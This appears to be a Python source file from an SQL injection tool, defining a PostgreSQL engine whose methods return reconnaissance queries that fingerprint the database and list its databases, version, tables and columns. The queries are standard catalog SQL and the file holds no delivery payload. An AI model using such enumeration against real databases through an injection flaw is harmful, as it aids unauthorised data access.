from src.engines.sql_injection_engine import SQLInjectionEngine

class SQLInjectionEnginePostgreSQL(SQLInjectionEngine):
    def __init__(self) -> None:
        super().__init__()

    def identify() -> str:
        return "EXISTS(SELECT datname FROM pg_database)"

    def database_names(self) -> str:
        return "SELECT datname FROM pg_catalog.pg_database"
    
    def version(self):
        return "SELECT version()"

    def tables(self) -> str:
        return "SELECT table_name FROM information_schema.tables"
    
    def column_names(self, table_name = None):
        if table_name == None:
            return f"SELECT * FROM information_schema.columns"
        else:
            return f"SELECT * FROM information_schema.columns WHERE table_name = '{table_name}'"